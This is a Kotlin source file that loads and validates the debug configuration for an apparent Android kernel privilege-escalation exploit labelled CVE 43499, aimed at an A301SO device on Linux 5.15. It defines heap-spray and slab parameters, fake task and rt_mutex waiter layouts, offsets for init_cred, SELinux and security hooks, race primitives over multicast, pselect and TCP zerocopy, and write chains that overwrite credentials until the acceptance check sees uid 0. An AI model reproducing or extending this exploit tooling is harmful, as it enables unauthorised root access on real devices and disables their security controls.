                skbFragBias = longOf(payload, "generator.payload", "skb_frag_bias"),
                tcpPayloadDelta = longOf(payload, "generator.payload", "tcp_payload_delta"),
                tcpChunkBias = longOf(payload, "generator.payload", "tcp_chunk_bias"),
                tcpFakeTaskOff = longOf(payload, "generator.payload", "tcp_fake_task_off"),
                compactWaiter = intOf(payload, "generator.payload", "compact_waiter"),
                fakeTaskUsageOff = longOf(payload, "generator.payload", "fake_task_usage_off"),
                fakeTaskPrio = longOf(payload, "generator.payload", "fake_task_prio"),
                fakeWaiterPrio = longOf(payload, "generator.payload", "fake_waiter_prio"),
                writeValueOffset = longOf(payload, "generator.payload", "write_value_offset"),
                pageAcceptBit = longOf(payload, "generator.payload", "page_accept_bit"),
            ),
            /* R3d：Credential 写布局的 image 域基址与 cred 镜像槽（legacy 目标常量；
             * A 决策下 Native 无同名常量。debug 注入层显式承载，迁移债见 data class KDoc）。 */
            credential = DebugCredentialGenerator(
                imageTextBase = 0xffffffc008000000uL.toLong(),
                copyOffset = 0x1080L,
                tcpCopyOffset = 0x6800L,
            ),
            multicast = DebugMulticastGenerator(
                frameSize = longOf(multicast, "generator.multicast", "frame_size"),
                familyOffset = longOf(multicast, "generator.multicast", "family_offset"),
                stampFamily = intOf(multicast, "generator.multicast", "stamp_family"),
                disarmRequired = intOf(multicast, "generator.multicast", "disarm_required"),
                futexWaiterFlag = longOf(multicast, "generator.multicast", "futex_waiter_flag"),
            ),
            pselect = DebugPselectGenerator(
                nfds = longOf(pselect, "generator.pselect", "nfds"),
                maxNfds = longOf(pselect, "generator.pselect", "max_nfds"),
                operationBudget = longOf(pselect, "generator.pselect", "operation_budget"),
                timeoutNanos = longOf(pselect, "generator.pselect", "timeout_nanos"),
                perAttemptDelayNs = longOf(pselect, "generator.pselect", "per_attempt_delay_ns"),
                enterDelayNs = longOf(pselect, "generator.pselect", "enter_delay_ns"),
                fdReserveStride = longOf(pselect, "generator.pselect", "fd_reserve_stride"),
                selectUseTimeval = longOf(pselect, "generator.pselect", "select_use_timeval"),
                waiterShift = longOf(pselect, "generator.pselect", "waiter_shift"),
            ),
            selectStackAnchor = parseSelectStackAnchor(config),
            /* task-119 临时实验键：unset/null=不覆盖；字符串必须 0x 十六进制。 */
            writeTargetOverride = optionalHexLong(
                config = config,
                prefix = "generator.write_target_override",
            ),
            tcp = DebugTcpGenerator(
                mappingSize = longOf(tcp, "generator.tcp", "mapping_size"),
                maxMapping = longOf(tcp, "generator.tcp", "max_mapping"),
                frameSize = longOf(tcp, "generator.tcp", "frame_size"),
                maxFrame = longOf(tcp, "generator.tcp", "max_frame"),
                receiveSize = longOf(tcp, "generator.tcp", "receive_size"),
                operationBudget = longOf(tcp, "generator.tcp", "operation_budget"),
                timeoutNanos = longOf(tcp, "generator.tcp", "timeout_nanos"),
                punchSpin = longOf(tcp, "generator.tcp", "punch_spin"),
                punchPhaseSpin = longOf(tcp, "generator.tcp", "punch_phase_spin"),
                postHoldIterations = longOf(tcp, "generator.tcp", "post_hold_iterations"),
                armSequence = longOf(tcp, "generator.tcp", "arm_sequence"),
                zcAddressOffset = longOf(tcp, "generator.tcp", "zc_address_offset"),
                zcLengthOffset = longOf(tcp, "generator.tcp", "zc_length_offset"),
                zcTaskOffset = longOf(tcp, "generator.tcp", "zc_task_offset"),
                zcLockOffset = longOf(tcp, "generator.tcp", "zc_lock_offset"),
                sendFillByte = longOf(tcp, "generator.tcp", "send_fill_byte"),
                mappingFillByte = longOf(tcp, "generator.tcp", "mapping_fill_byte"),
            ),
        )
        if (parsed.payload.compactWaiter != 1) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:generator.payload.compact_waiter:" +
                    parsed.payload.compactWaiter,
            )
        }
        if (parsed.pselect.fdReserveStride < MIN_PSELECT_FD_RESERVE_STRIDE) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:generator.pselect.fd_reserve_stride:" +
                    parsed.pselect.fdReserveStride,
            )
        }
        return parsed
    }

    /**
     * 解析 `route[*].select_stack` 的 5.10 lock anchor（可选；缺省=旧行为）。
     *
     * @param config 已 resolve 的 HOCON。
     * @return null（无 select_stack 或三 anchor 键全缺）；否则完整 anchor。
     * @throws Cve43499DebugConfigException select_stack 存在但 compact_waiter≠1、anchor 键
     *   部分缺失/非法、bytes<stride、image 溢出。
     */
    private fun parseSelectStackAnchor(config: Config): DebugSelectStackAnchor? {
        val routes = configValue("route", "list") { config.getConfigList("route") }
        val entry = routes.firstOrNull { it.hasPath("select_stack") } ?: return null
        val select = configValue("route[*].select_stack", "config") {
            entry.getConfig("select_stack")
        }
        val compact = intOf(select, "route.select_stack", "compact_waiter")
        if (compact != 1) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:route.select_stack.compact_waiter:$compact",
            )
        }
        val keys = listOf("lock_anchor_image", "lock_anchor_bytes", "lock_anchor_stride")
        val present = keys.map { select.hasPath(it) }
        if (present.none { it }) return null
        if (!present.all { it }) {
            throw Cve43499DebugConfigException(
                "debug-config-missing:route.select_stack.lock_anchor_*",
            )
        }
        val image = longOf(select, "route.select_stack", "lock_anchor_image")
        val bytes = longOf(select, "route.select_stack", "lock_anchor_bytes")
        val stride = longOf(select, "route.select_stack", "lock_anchor_stride")
        if (image < 0L || bytes <= 0L || stride <= 0L || bytes < stride ||
            image > Long.MAX_VALUE - bytes) {
            throw Cve43499DebugConfigException(
                "debug-config-invalid:route.select_stack.lock_anchor:" +
                    "$image/$bytes/$stride",
            )
        }
        return DebugSelectStackAnchor(
            compactWaiter = compact,
            lockAnchorImage = image,
            lockAnchorBytes = bytes,
            lockAnchorStride = stride,
        )
    }

    /**
     * 读取子配置的 Long 键；缺失/类型不符 ⇒ 带完整路径的具名失败。
     *
     * @param config 子配置。
     * @param prefix 完整路径前缀（诊断用）。
     * @param key 键名。
     * @return 值。
     */
    private fun longOf(config: Config, prefix: String, key: String): Long =
        configValue("$prefix.$key", "long") {
            if (!config.hasPath(key)) {
                throw Cve43499DebugConfigException("debug-config-missing:$prefix.$key")
            }
            config.getLong(key)
        }

    /**
     * 可选十六进制 Long（task-119 临时实验键）。
     *
     * @param config 已 resolve 的 HOCON。
     * @param prefix 完整路径（诊断用）。
     * @return null=键不存在/null（不覆盖）；否则解析后的 Long。
     * @throws Cve43499DebugConfigException 字符串非法/非 0x 前缀（fail-closed）。
     */
    private fun optionalHexLong(config: Config, prefix: String): Long? {
        if (!config.hasPath(prefix) || config.getIsNull(prefix)) return null
        if (config.getValue(prefix).valueType() == ConfigValueType.NUMBER) {
            val numeric = config.getLong(prefix)
            return if (numeric == 0L) {
                null
            } else {
                throw Cve43499DebugConfigException("debug-config-invalid:$prefix:$numeric")
            }
        }
        val raw = configValue(prefix, "string") { config.getString(prefix) }.trim()
        if (raw.equals("unset", ignoreCase = true) || raw == "0") return null
        if (!raw.startsWith("0x", ignoreCase = true) || raw.length <= 2) {
            throw Cve43499DebugConfigException("debug-config-invalid:$prefix:$raw")
        }
        return try {
            java.lang.Long.parseUnsignedLong(raw.substring(2), 16)
        } catch (problem: NumberFormatException) {
            throw Cve43499DebugConfigException("debug-config-invalid:$prefix:$raw", problem)
        }
    }

    /**
     * 读取子配置的 Int 键；缺失/类型不符 ⇒ 带完整路径的具名失败。
     *
     * @param config 子配置。
     * @param prefix 完整路径前缀（诊断用）。
     * @param key 键名。
     * @return 值。
     */
    private fun intOf(config: Config, prefix: String, key: String): Int =
        configValue("$prefix.$key", "int") {
            if (!config.hasPath(key)) {
                throw Cve43499DebugConfigException("debug-config-missing:$prefix.$key")
            }
            config.getInt(key)
        }

    /**
     * @return 具名子配置；缺失 ⇒ fail-closed（不返回空配置）。
     */
    private fun requireConfig(config: Config, path: String): Config = try {
        config.getConfig(path)
    } catch (problem: Throwable) {
        throw Cve43499DebugConfigException("debug-config-missing:$path", problem)
    }
}

/**
 * A301SO debug 配置读取/校验失败（fail-closed；不填默认值）。
 *
 * @property message 具名原因（`debug-config-missing:<path>` 等）。
 */
internal class Cve43499DebugConfigException(
    override val message: String,
    cause: Throwable? = null,
) : IllegalStateException(message, cause)

/** A301SO debug 配置文件解析结果（只承载 A301SO 事实性参数 + 注入选择）。 */
internal data class Cve43499DebugParameters(
    val release: String,
    val kernelMajor: Int,
    val route: DebugMulticastRoute,
    val offsets: DebugOffsets,
    val taskStruct: DebugTaskStruct,
    val cred: DebugCred,
    val kernelsnitch: DebugKernelsnitch,
    /* R3b：单 route 注入选择（multicast/pselect/tcp_zerocopy；不 fallback）。 */
    val injection: DebugInjection,
    /* R3b：三路 generator 的目标事实与布局参数（见 `generator` 段）。 */
    val generator: DebugGeneratorParameters,
    /* R3e：perf 采样原语参数（`perf` 段）；null=未配置⇒perf 路径禁用。 */
    val perf: DebugPerfParameters? = null,
    /* G01：dirty/retained fail-stop 开关（`failStop` 段；缺省=legacy 同形 enabled）。 */
    val failStop: DebugFailStopParameters = DebugFailStopParameters(enabled = 1),
    /* G08：Actor CPU pin 覆盖（`execution` 段；缺省=legacy 0/1/2）。 */
    val cpu: DebugExecutionCpu = DebugExecutionCpu(),
    /* task-135：execution.race 时序参数（缺省=旧 1s/50ms 行为）。 */
    val race: DebugRaceParameters? = null,
    /* G05：fast-repair prebuild 开关（`writeChain` 段；缺省=false ⇒ 零行为变化）。 */
    val fastRepair: DebugFastRepairFlags = DebugFastRepairFlags(),
    /* B6：finish 派发前 settle（`finish` 段；缺省 2000ms）。 */
    val finish: DebugFinishParameters = DebugFinishParameters(),
    /* G05/B4：debug 多写链参数显式覆盖（可空=按注入 primitive 派生）。 */
    val writeChain: DebugWriteChainParameters? = null,
)

/**
 * B6 finish settle debug 参数（`finish` 段）。
 *
 * @property preDispatchSettleMs 派发前有界 settle（毫秒；0..10000，缺省 2000）。
 */
internal data class DebugFinishParameters(
    val preDispatchSettleMs: Long = 2_000L,
    /** task-84：acceptance 期望 uid（debug-only；默认 0=root；负值 fail-closed）。 */
    val expectedUid: Long = 0L,
)

/**
 * G05 fast-repair prebuild debug 开关（`writeChain` 段）。
 *
 * @property fastRepairPrebuildEnabled true=W1 出口预建 repair placement+landing（E6 显式打开）。
 * @property allowFullFallback true=prebuild clean failure 后允许 W2 完整 fallback（panic 窗口不改善）。
 * @note 缺省 false/false（fail-closed）；release 不读 debug 配置。
 */
internal data class DebugFastRepairFlags(
    val fastRepairPrebuildEnabled: Boolean = false,
    val allowFullFallback: Boolean = false,
)

/**
 * G01 fail-stop 参数（`failStop` 段；debug-only）。
 *
 * @property enabled 1=DIRTY/retained 先落 evidence 再强制终止（legacy exit_group(70) 同形）；
 *   0=只记录不终止（仅调试用）。缺省=1（legacy 同形；conf 两份显式写 1）。
 * @note 阶段：P1b-1（task-64）；release 不读 debug 配置。
 */
internal data class DebugFailStopParameters(val enabled: Int)

/**
 * G08 Actor CPU pin 覆盖（`execution` 段；debug-only）。
 *
 * @property ownerCpu owner 线程 CPU；[NO_PIN_CPU]=不 pin（Native 0xFFFFFFFF 哨兵）。
 * @property waiterCpu waiter 线程 CPU；[NO_PIN_CPU]=不 pin。
 * @property consumerCpu consumer 线程 CPU（必须 pin，禁止哨兵）。
 * @note 缺省=legacy 行为 owner=0/waiter=1/consumer=2；阶段：P1b-1（task-64）。
 */
internal data class DebugExecutionCpu(
    val ownerCpu: Int = 0,
    val waiterCpu: Int = 1,
    val consumerCpu: Int = 2,
)

/**
 * task-135/S4：execution.race 时序参数（debug-only）。
 *
 * @property parkTimeoutMs waiter park timeout（毫秒）。
 * @property routeDoneTimeoutMs execute/route_done 窗口（毫秒）。
 * @property setupSettleUs ready 后 settle（微秒）。
 * @note 缺省段=null ⇒ 沿用 [DebugExecutionParameters] 旧值；不允许默认值猜测。
 */
internal data class DebugRaceParameters(
    val parkTimeoutMs: Long,
    val routeDoneTimeoutMs: Long,
    val setupSettleUs: Long,
)

/** `route[0].multicast_waiter` 参数。 */
internal data class DebugMulticastRoute(
    val waiterOff: Int,
    val bufferSize: Int,
    val taskOffset: Int,
    val lockOffset: Int,
    val compactWaiter: Int,
)

/** `offset` 段（10 个具名偏移）。 */
internal data class DebugOffsets(
    val initTask: Long,
    val initCred: Long,
    val emptyZeroPage: Long,
    val rootTaskGroup: Long,
    val selinuxEnforcing: Long,
    val selinuxBlobSizes: Long,
    val securityHookHeads: Long,
    val slideNfulnlLogger: Long,
    val slideBootId: Long,
    val slideLoggers01: Long,
)

/** `task_struct` 段（15 个具名字段）。 */
internal data class DebugTaskStruct(
    val prio: Int,
    val normalPrio: Int,
    val schedTaskGroup: Long,
    val piLock: Long,
    val piWaiters: Long,
    val piTopTask: Long,
    val piBlockedOn: Long,
    val pid: Long,
    val tgid: Long,
    val atomicFlags: Long,
    val realCred: Long,
    val cred: Long,
    val comm: Long,
    val tasks: Long,
    val seccomp: Long,
)

/** `cred` 段（15 个具名字段；6.x 才用的 ref 槽位在本 5.15 debug 文件中有实值）。 */
internal data class DebugCred(
    val capsOffset: Long,
    val copySize: Long,
    val usageOffset: Long?,
    val usageValue: Long,
    val capsCount: Long,
    val capsValue: Long,
    val ref0Offset: Long?,
    val ref1Offset: Long?,
    val ref2Offset: Long?,
    val ref3Offset: Long?,
    val refCount: Long?,
    val ref0Image: Long?,
    val ref1Image: Long?,
    val ref2Image: Long?,
    val ref3Image: Long?,
)

/** `kernelsnitch` 段；`mmStructSz` 为 Native 参数化后的 mm_struct 步长候选。 */
internal data class DebugKernelsnitch(
    val collisions: Int,
    val mmStructSz: Long,
)

/**
 * debug 批允许的 Primitive。
 *
 * @note R3b 起三路均可由 generator 注入启用；选择源 = `injection.primitive`
 *   （单 route，不做 fallback）。缺 generator/缺参数 ⇒ fail-closed 具名拒绝。
 */
internal enum class DebugPrimitiveKind {
    MULTICAST,
    PSELECT,
    TCP_ZEROCOPY,
}

/**
 * debug 注入执行参数（策略参数，非 A301SO 硬件事实）。
 *
 * @note P0b 显式常量；P0c generator/真机调参批次可迁出为配置。
 */
internal data class DebugExecutionParameters(
    val placementCpu: Int,
    val measurementCpu: Int,
    val timeoutNanos: Long,
    val pageSize: Long,
    val allocationSize: Long,
    val slabOrder: Long,
    val mmStructSize: Long,
    val mmPartials: Long,
    val prepareSlabs: Long,
    val snitchCollisions: Long,
    val pollUs: Long,
    val requiredAlignment: Long,
    val scanLowerBound: Long,
    val scanUpperBound: Long,
    val scanStep: Long,
    val scanRoundLimit: Long,
    val objectsPerSlab: Int,
    val prepareObjectCount: Int,
    val sprayObjectCount: Int,
    val preObjectCount: Int,
    val postObjectCount: Int,
    /* R2（A 决策）：原 Native STRUCT_/WIRE_ 常量改为 debug 注入参数（非 Native 默认）。 */
    val identityStart: Long,
    val identityEnd: Long,
    val leakTagNibble: Long,
    val leakTagShift: Long,
    val stagingCapacity: Long,
    val maxContextEntries: Long,
    val maxObjectsPerSlab: Long,
    val maxMeasurementRounds: Long,
    val socketSendBufferSize: Long,
    val reclaimSendLimit: Long,
    val reclaimPayloadSize: Long,
    val fillByte: Long,
    val contentGeneration: Long,
    /* R3a-2/B6：页接受判据的**冻结兼容路径**参数（无 generator 注入时使用）。
     * R3b 起 generator 路径由 `generator.payload.write_value_offset/page_accept_bit`
     * 按 legacy payload_write_layout + accepts_page 派生，不再读这三个字段。 */
    val pageAcceptRequired: Long,
    val pageAcceptOffset: Long,
    val pageAcceptBit: Long,
    val ownerCpu: Int,
    val waiterCpu: Int,
    val consumerCpu: Int,
    val ownerPriority: Int,
    val waiterPriority: Int,
    val consumerPriority: Int,
    val threadCount: Int,
    val prepareTimeoutNanos: Long,
    val parkedTimeoutNanos: Long,
    val executionTimeoutNanos: Long,
    val shutdownTimeoutNanos: Long,
    val consumerMax: Long,
    val consumerBurst: Long,
    val lockPiSpinNs: Long,
    val setupSettleUs: Long,
    val requeueExpected: Long,
    val disarmSpinLimit: Long,
    val multicastSocketBufferSize: Long,
    val multicastOperationBudget: Long,
    val multicastTimeoutNanos: Long,
    val multicastAddressFamily: Int,
    val multicastArmHoldNs: Long,
    val multicastArmSequence: Long,
)

/**
 * victim 传输选择（R4/批 B2）。
 *
 * @property PROCESS 既有 backend `ProcessVictimSession`（Kotlin shell 循环；默认）。
 * @property JNI_SPAWN 通用 `core/victim` helper（JNI posix_spawn；需 `perf.enabled=1`）。
 * @note 默认 [PROCESS]：关闭时单 W1/旧 victim 路径行为不变。
 */
internal enum class DebugVictimTransport {
    PROCESS,
    JNI_SPAWN,

    /** A1/A2a provisional：公共 core `VictimSession`+`VictimNativeJni` helper（opt-in）。 */
    COMMON,
}

/**
 * 单 route 注入选择（R3b）+ victim 传输选择（R4/批 B2）。
 *
 * @property primitive 本次注入只走这一条物理机制；不存在 fallback/自动切换。
 * @property victim victim 传输实现；JNI_SPAWN 仅在 perf 配置齐全时启用，
 *   缺配置 fail-closed（不静默回退）。
 * @note 来源：debug 配置 `injection.primitive`（multicast | pselect | tcp_zerocopy）
 *   与 `injection.victim`（process | jni-spawn）。
 */
internal data class DebugInjection(
    val primitive: DebugPrimitiveKind,
    val victim: DebugVictimTransport = DebugVictimTransport.PROCESS,
)

/**
 * image → direct-map 地址模型（legacy2 `address_math.cpp:data_alias` 的参数化）。
 *
 * @property directMapBase 内核直映射基址（旧 `P0_PAGE_OFFSET`）。
 * @property kernelPhysLoad 内核 Image 物理装载地址（旧 `P0_KERNEL_PHYS_LOAD`）。
 * @property kernelPhysOffset DRAM 线性映射物理偏移（旧 `P0_PHYS_OFFSET`）。
 * @note 别名公式：`((kernel_phys_load + symbol_off) - kernel_phys_offset) | direct_map_base`；
 *   其中 `symbol_off` 是相对内核 Image 文本基址的符号偏移（debug 配置 `offset.*`）。
 */
internal data class DebugAddressModel(
    val directMapBase: Long,
    val kernelPhysLoad: Long,
    val kernelPhysOffset: Long,
)

/**
 * payload 页槽位布局（legacy2 `target.h` / very_legacy `common.h` 的参数化）。
 *
 * @property lockOff `rt_mutex` lock 槽在发送缓冲内的偏移（旧 0x0e80）。
 * @property w0Off 栈上 waiter 形状槽偏移（旧 0x1180）。
 * @property rightOff rb 右节点槽偏移（旧 0x1240）。
 * @property leftOff rb 左节点槽偏移（旧 0x1260）。
 * @property fakeTaskOff 假 task 槽偏移（旧 0x1280）。
 * @property skbDataDelta multicast/pselect 的 payload 基址修正（旧 -0xe80）。
 * @property skbFragBias 分片填充偏置（旧 0）。
 * @property tcpPayloadDelta tcp 布局的 payload 基址修正（旧 0）。
 * @property tcpChunkBias tcp 布局的 chunk 偏置（旧 0xe80）。
 * @property tcpFakeTaskOff tcp 布局的假 task 槽偏移（旧 0x5800）。
 * @property compactWaiter 1=`tree_entry` compact waiter（A301SO 5.15），0=rb_node 布局（本批拒绝）。
 * @property fakeTaskUsageOff 假 task 的 usage 字段偏移（旧 0x40）。
 * @property fakeTaskPrio 假 task/waiter 的优先级常量（旧 120/140）。
 * @property writeValueOffset preserve_child 写值相对候选页基址的偏移（旧 0x100）。
 * @property pageAcceptBit 页接受判据检查的位下标（旧 selinux_state.initialized 位 16）。
 */
internal data class DebugPayloadLayout(
    val lockOff: Long,
    val w0Off: Long,
    val rightOff: Long,
    val leftOff: Long,
    val fakeTaskOff: Long,
    val skbDataDelta: Long,
    val skbFragBias: Long,
    val tcpPayloadDelta: Long,
    val tcpChunkBias: Long,
    val tcpFakeTaskOff: Long,
    val compactWaiter: Int,
    val fakeTaskUsageOff: Long,
    val fakeTaskPrio: Long,
    val fakeWaiterPrio: Long,
    val writeValueOffset: Long,
    val pageAcceptBit: Long,
)

/**
 * multicast generator 参数（stamp 几何 + D3 ghost disarm）。
 *
 * @property frameSize stamp 长度（旧 buffer_size=264）。
 * @property familyOffset `sockaddr` family 在 stamp 内的字节偏移（旧 8）。
 * @property stampFamily 写入 stamp 的地址族（旧 `AF_UNSPEC`=0；copy 先于 family 检查）。
 * @property disarmRequired 1=路由后执行 ghost disarm（旧 kernel5 D3）。
 * @property futexWaiterFlag `FUTEX_WAITERS` 位（旧 0x80000000；与 ghost_pid 组合）。
 */
internal data class DebugMulticastGenerator(
    val frameSize: Long,
    val familyOffset: Long,
    val stampFamily: Int,
    val disarmRequired: Int,
    val futexWaiterFlag: Long,
)

/**
 * pselect generator 参数（fd_set 词表 + 窗口）。
 *
 * @property nfds 描述符上界（旧 320）。
 * @property maxNfds Native 容量上限（旧 FD_SETSIZE 内 320）。
 * @property operationBudget select attempt 上限（旧 compact attempts=4）。
 * @property timeoutNanos Native 事务总 deadline（旧 select_timeout_us×attempts）；
 *   G02：Native 每次 select 超时=min(remaining, timeout_ns/max(1,operation_budget))
 *   （800ms/4=200ms 与 legacy 4×200ms 等价；见 `pselect_timeout_internal.h`）。
 * @property perAttemptDelayNs attempt 间隔（旧 0；enter delay 单独表达）。
 * @property enterDelayNs consumer 起跑延迟（旧 50ms）。
 * @property fdReserveStride fd 备份起点步长（旧 nfds+64）。
 * @property selectUseTimeval 0=pselect(timeval 签名 pselect)分支；1=select 分支（旧 compact=0）。
 * @property waiterShift waiter 词表相对全局词的位移（旧 -2）。
 */
internal data class DebugPselectGenerator(
    val nfds: Long,
    val maxNfds: Long,
    val operationBudget: Long,
    val timeoutNanos: Long,
    val perAttemptDelayNs: Long,
    val enterDelayNs: Long,
    val fdReserveStride: Long,
    val selectUseTimeval: Long,
    val waiterShift: Long,
)

/**
 * task-134/S3：select_stack lock anchor（镜像相对偏移；缺省 null=旧 fake_lock）。
 *
 * @property compactWaiter 必须=1（5.10 compact waiter；显式配置，不写死默认）。
 * @property lockAnchorImage 镜像相对偏移（相对 _text/link base）。
 * @property lockAnchorBytes 可用全零字节数（anchor 轮转上界）。
 * @property lockAnchorStride slot 间距（diting 5.10 实测 0x20；本机未独立 kprobe）。
 */
internal data class DebugSelectStackAnchor(
    val compactWaiter: Int,
    val lockAnchorImage: Long,
    val lockAnchorBytes: Long,
    val lockAnchorStride: Long,
)

/**
 * tcp zerocopy generator 参数（zc 请求体 + mapping/punch）。
 *
 * @property mappingSize punch 映射长度（旧 16 MiB）。
 * @property maxMapping Native 映射容量上限（与 mappingSize 同）。
 * @property frameSize zc 请求体长度（旧 0x40）。
 * @property maxFrame Native 帧容量上限（旧 0x40）。
 * @property receiveSize 发送小包/映射长度字段（旧 64）。
 * @property operationBudget getsockopt attempt 上限（旧 2000）。
 * @property timeoutNanos Native 事务总 deadline。
 * @property punchSpin 等待 punch 相位 0 的自旋上限（旧 10,000,000）。
 * @property punchPhaseSpin 等待 punch 相位 1 的独立自旋上限（旧实现无界，本批给同值上限）。
 * @property postHoldIterations arm 后 consumer 保持迭代数（旧 20000）。
 * @property armSequence 第几次成功 get 之后才 arm（旧 16）。
 * @property zcAddressOffset/… 四字段在请求体内的偏移（旧 0x18/0x20/0x28/0x30）。
 * @property sendFillByte 发送小包填充（旧 0x33）。
 * @property mappingFillByte 映射页填充（旧 0x55）。
 */
internal data class DebugTcpGenerator(
    val mappingSize: Long,
    val maxMapping: Long,
    val frameSize: Long,
    val maxFrame: Long,
    val receiveSize: Long,
    val operationBudget: Long,
    val timeoutNanos: Long,
    val punchSpin: Long,
    val punchPhaseSpin: Long,
    val postHoldIterations: Long,
    val armSequence: Long,
    val zcAddressOffset: Long,
    val zcLengthOffset: Long,
    val zcTaskOffset: Long,
    val zcLockOffset: Long,
    val sendFillByte: Long,
    val mappingFillByte: Long,
)

/**
 * 三路 generator 的完整输入（目标事实 + 布局；R3b）。
 *
 * @property credential R3d Credential 写布局（cred 镜像拷贝位置 + image 文本基址）。
 * @note 全部值来自 debug 配置 `generator` 段 + R3d 显式目标常量；缺键 fail-closed，
 *   无默认回退。
 */
internal data class DebugGeneratorParameters(
    val addressModel: DebugAddressModel,
    val payload: DebugPayloadLayout,
    val credential: DebugCredentialGenerator,
    val multicast: DebugMulticastGenerator,
    val pselect: DebugPselectGenerator,
    val tcp: DebugTcpGenerator,
    /**
     * 临时实验键（task-119）：W1 写目标覆盖；null=原 `writeTarget()`。
     * 仅 debug 配置（release 不读）；实验后移除，不进入生产语义。
     */
    val writeTargetOverride: Long? = null,
    /** task-134/S3：select_stack anchor；null=旧 fake_lock 行为。 */
    val selectStackAnchor: DebugSelectStackAnchor? = null,
)

/**
 * Credential（W2）payload 布局参数（R3d）。
 *
 * @property imageTextBase 内核 Image 文本基址（legacy `KIMAGE_TEXT_BASE`=
 *   0xffffffc008000000；cred `ref*_image` 是相对该基址的绝对 image 地址）。
 * @property copyOffset 非 tcp 布局的 cred 镜像在发送缓冲内的偏移（legacy
 *   `kernel::CRED_COPY_OFF`=0x1080）。
 * @property tcpCopyOffset tcp 布局的 cred 镜像偏移（legacy `TCP_CRED_COPY_OFF`=0x6800，
 *   因为 tcp 的 fake_task@0x5800 覆盖 0x1080 槽）。
 * @note 来源：`legacy2/core/target.h:33-44,230-245`、`legacy2/core/support.cpp:300-345`
 *   （`fill_profile_cred_copy`）。当前以显式目标常量承载（与 A 决策一致：Native 无
 *   同名常量；Kotlin debug 注入层登记迁移债，P0c 前迁入 debug 配置）。
 */
internal data class DebugCredentialGenerator(
    val imageTextBase: Long,
    val copyOffset: Long,
    val tcpCopyOffset: Long,
)

/**
 * R3e perf 采样原语的显式参数（debug 专用；`perf.enabled=0` 默认关闭）。
 *
 * @property enabled 1=允许构造 perf target source；0=禁用（默认）。
 * @property attrType/attrConfig/attrSamplePeriod/attrSampleType/attrSampleRegsIntr/
 *   attrFlags/attrDisabled `perf_event_attr` 与 open flags 的显式值。
 * @property excludeUser/excludeHv/excludeIdle 排除上下文位。
 * @property autoEnable open 后是否自动 ENABLE。
 * @property ringPages 环数据页数（mmap 长度=(ringPages+1)×pageSize）。
 * @property pumpIterations 每 pass 驱动 victim 的 uid probe 次数。
 * @property pumpBudgetNanos 每 pass pump 的墙钟预算（纳秒；0=无预算）。
 * @property maxPasses 最多 pass 数（2..3；2-of-3 一致性）。
 * @property minVotesFloor 票数下限（64）。
 * @property minVotesRatio 票数比例下限（对同意 pass 的 agree_candidates）。
 * @property taskAlignment 0x200 对齐要求（0=仅记录 evidence）。
 * @property registerCount/spRegisterIndex 寄存器数/`sp` 下标（32/31）。
 * @property candidateCapacity 候选集容量（256）。
 * @property requireAlignment/requireSpEvidence 1=硬校验（默认 0；G1 后收紧）。
 * @property settleAfterAcquireUs 取址成功后的有界 settle（微秒）。
 * @note 阶段：R3e；全部必填（除 enabled 外），缺键 fail-closed。
 */
internal data class DebugPerfParameters(
    val enabled: Int,
    val attrType: Long,
    val attrConfig: Long,
    val attrSamplePeriod: Long,
    val attrSampleType: Long,
    val attrSampleRegsIntr: Long,
    val attrFlags: Long,
    val attrDisabled: Long,
    val excludeUser: Long,
    val excludeHv: Long,
    val excludeIdle: Long,
    val autoEnable: Long,
    val ringPages: Long,
    val pumpIterations: Long,
    val pumpBudgetNanos: Long,
    val maxPasses: Int,
    val minVotesFloor: Long,
    val minVotesRatio: Double,
    val taskAlignment: Long,
    val registerCount: Int,
    val spRegisterIndex: Int,
    val candidateCapacity: Int,
    val requireAlignment: Int,
    val requireSpEvidence: Int,
    val settleAfterAcquireUs: Long,
)

/**
 * R3d 多写链的显式参数（debug 专用；见 [Cve43499DebugConfig.writeChainParameters]）。
 *
 * @property w1Attempts W1 尝试次数（legacy `execution.stages.w1_attempts`；multicast
 *   在 legacy 被强制为 1，由调用方按 route 解析后传入）。
 * @property w1SettleUs W1 成功后 settle。
 * @property w1bAttempts W1b 私有 scratch 修复尝试次数（`w1_scratch_repair_attempts`）。
 * @property w1bSettleUs W1b 每次失败后的退避。
 * @property w2Attempts W2 凭据写尝试次数（`w2_attempts`）。
 * @property w2SettleUs W2 路由成功后 settle（`w2_settle_us`）。
 * @property fastRepairSettleUs fast-repair 的 consumer/settle 延迟（旧 5000µs）。
 * @property fastRepairParkedTimeoutNanos fast-repair 的 waiter 等待窗口（旧 20ms）。
 * @property fastRepairLockPiSpinNs fast-repair 的 PI 自旋上限（须 ≤ 等待窗口，Native 校验）。
 * @property w3ChainRounds W2/W3 链轮次（`w3_chain_rounds`；>1 需 victim restarter seam）。
 * @property w3Attempts W3 尝试次数（`w3_attempts`）。
 * @property w3SettleUs W3 每次写后 settle（`w3_settle_us`）。
 * @property w3LeafProbeAttempts W3-0 leaf 方向探针写次数（legacy 硬编码 4）。
 * @property w3LeafProbeSettleUs W3-0 每次探针后的 settle（legacy 硬编码 50000）。
 * @property attemptBackoffUs 路由 clean failure 后的退避（legacy `usleep(100000)`）。
 * @property verifyBackoffUs 验收未过后的退避（legacy `usleep(50000)`）。
 * @property threadInfoFlagsOffset task_struct 内 thread_info.flags 偏移（5.15=0）。
 */
internal data class DebugWriteChainParameters(
    val w1Attempts: Int,
    val w1SettleUs: Long,
    val w1bAttempts: Int,
    val w1bSettleUs: Long,
    val w2Attempts: Int,
    val w2SettleUs: Long,
    val fastRepairSettleUs: Long,
    val fastRepairParkedTimeoutNanos: Long,
    val fastRepairLockPiSpinNs: Long,
    val w3ChainRounds: Int,
    val w3Attempts: Int,
    val w3SettleUs: Long,
    val w3LeafProbeAttempts: Int,
    val w3LeafProbeSettleUs: Long,
    val attemptBackoffUs: Long,
    val verifyBackoffUs: Long,
    val threadInfoFlagsOffset: Long,
    /* G05 append-only（默认 false；缺省保持既有行为）。 */
    val fastRepairPrebuildEnabled: Boolean = false,
    val allowFullFallback: Boolean = false,
)
